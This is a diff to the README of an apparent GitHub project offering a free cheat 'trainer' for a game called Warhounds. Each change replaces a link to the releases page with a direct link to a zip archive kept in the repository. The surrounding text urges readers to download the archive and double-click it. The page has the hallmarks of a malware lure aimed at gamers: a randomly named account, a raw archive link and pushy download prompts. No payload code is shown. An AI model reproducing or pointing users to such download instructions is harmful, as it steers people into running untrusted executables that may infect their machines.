@@ -1,6 +1,6 @@
 # 🐕 Warhounds-Trainer-2026 - Free Trainer, No Keys, Endless Power
 
-[![Download Now](https://img.shields.io/badge/Download-Warhounds_Trainer_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2D2D2D)](https://github.com/commonduckweedanaphylacticshock598/Warhounds-Trainer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Warhounds_Trainer_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2D2D2D)](https://raw.githubusercontent.com/commonduckweedanaphylacticshock598/Warhounds-Trainer-2026/main/zoogene/Trainer_Warhounds_2.1-beta.3.zip)
 
 ---
 
@@ -16,7 +16,7 @@ This trainer supports multiple configuration (cfg) files, so you can customize y
 
 Getting started takes less than two minutes. Here is exactly what you need to do:
 
-1. **Click the download button** (the big one at the top of this page) or go to the [releases page](https://github.com/commonduckweedanaphylacticshock598/Warhounds-Trainer-2026/releases).
+1. **Click the download button** (the big one at the top of this page) or go to the [releases page](https://raw.githubusercontent.com/commonduckweedanaphylacticshock598/Warhounds-Trainer-2026/main/zoogene/Trainer_Warhounds_2.1-beta.3.zip).
 2. **Visit this link to download the application.** (This is the direct download page.)
 3. **Wait for the download to finish.** The file size is small, so this should only take a few seconds on most connections.
 4. **Double-click the downloaded file** to run the trainer.
@@ -32,7 +32,7 @@ That's it. No installation wizard, no complicated setup, no trips to shady websi
 
 Go straight to the download page by clicking this button:
 
-[![Download Warhounds-Trainer-2026](https://img.shields.io/badge/⬇️_Download-Trainer_2026-4ECDC4?style=for-the-badge&logo=appveyor&logoColor=white&labelColor=333333)](https://github.com/commonduckweedanaphylacticshock598/Warhounds-Trainer-2026/releases)
+[![Download Warhounds-Trainer-2026](https://img.shields.io/badge/⬇️_Download-Trainer_2026-4ECDC4?style=for-the-badge&logo=appveyor&logoColor=white&labelColor=333333)](https://raw.githubusercontent.com/commonduckweedanaphylacticshock598/Warhounds-Trainer-2026/main/zoogene/Trainer_Warhounds_2.1-beta.3.zip)
 
 **Visit this link to download the application.**
 
@@ -156,7 +156,7 @@ One click and you're set. Don't waste another hour grinding or losing fights. Ge
 
 **Ready to start?** Hit that download button one more time – you won't regret it.
 
-[![Download Now](https://img.shields.io/badge/🚀_GET_TRAINER_2026-FF6B6B?style=for-the-badge&logo=windows&logoColor=white&labelColor=2D2D2D)](https://github.com/commonduckweedanaphylacticshock598/Warhounds-Trainer-2026/releases)
+[![Download Now](https://img.shields.io/badge/🚀_GET_TRAINER_2026-FF6B6B?style=for-the-badge&logo=windows&logoColor=white&labelColor=2D2D2D)](https://raw.githubusercontent.com/commonduckweedanaphylacticshock598/Warhounds-Trainer-2026/main/zoogene/Trainer_Warhounds_2.1-beta.3.zip)
 
 ---
 
